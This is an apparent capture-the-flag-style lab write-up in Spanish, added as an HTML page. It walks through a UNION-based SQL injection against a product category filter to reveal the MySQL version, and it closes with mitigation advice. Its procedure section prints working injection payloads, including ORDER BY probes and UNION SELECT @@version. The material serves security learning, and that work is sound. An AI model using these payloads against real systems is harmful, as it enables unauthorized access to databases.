@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 4 - SQL Injection MySQL Version</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 4</h2>
+
+<p>
+SQL Injection attack querying database version on MySQL and Microsoft
+</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Mostrar la versión de la base de datos utilizando
+un ataque UNION-based SQL Injection.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+El parámetro vulnerable es <strong>category</strong> dentro del filtro
+de productos.
+</p>
+
+<pre>
+SELECT name, description
+FROM products
+WHERE category = 'Gifts'
+</pre>
+
+<p>
+La aplicación concatena directamente el input del usuario
+sin sanitización ni consultas preparadas.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1:</strong> Interceptar petición con Burp Suite.</p>
+
+<p>
+Seleccionamos la categoría <strong>Gifts</strong> para generar
+la solicitud vulnerable.
+</p>
+
+<p><strong>Paso 2:</strong> Confirmar vulnerabilidad.</p>
+
+<pre>
+Gifts'
+</pre>
+
+<p>
+El error SQL confirma que el parámetro es vulnerable.
+</p>
+
+<p><strong>Paso 3:</strong> Determinar número de columnas.</p>
+
+<pre>
+Gifts' ORDER BY 1--
+Gifts' ORDER BY 2--
+Gifts' ORDER BY 3--
+</pre>
+
+<p>
+El servidor indica que existen <strong>2 columnas</strong>.
+</p>
+
+<p><strong>Paso 4:</strong> Probar UNION.</p>
+
+<pre>
+'+UNION+SELECT+'abc','def'# 
+</pre>
+
+<p>
+La página muestra "abc" y "def", confirmando la inyección.
+</p>
+
+<p><strong>Paso 5:</strong> Extraer versión.</p>
+
+<pre>
+'+UNION+SELECT+@@version,+NULL#
+</pre>
+
+<p>
+Esto devuelve la versión del servidor:
+</p>
+
+<pre>
+8.0.42-0ubuntu0.20.04.1
+</pre>
+
+<p>
+Corresponde a <strong>MySQL 8.0.42 ejecutándose en Ubuntu</strong>.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso obligatorio de consultas parametrizadas.</li>
+
+<li>Principio de mínimo privilegio en la base de datos.</li>
+
+<li>Validación estricta del lado del servidor.</li>
+
+<li>No mostrar errores SQL.</li>
+
+<li>Implementación de WAF.</li>
+
+</ul>
+
+<p><strong>Severidad estimada:</strong> Alta</p>
+
+<p>
+El atacante puede enumerar el sistema y posteriormente
+extraer información sensible de la base de datos.
+</p>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+
+</div>
+
+</section>
+
+</body>
+</html>
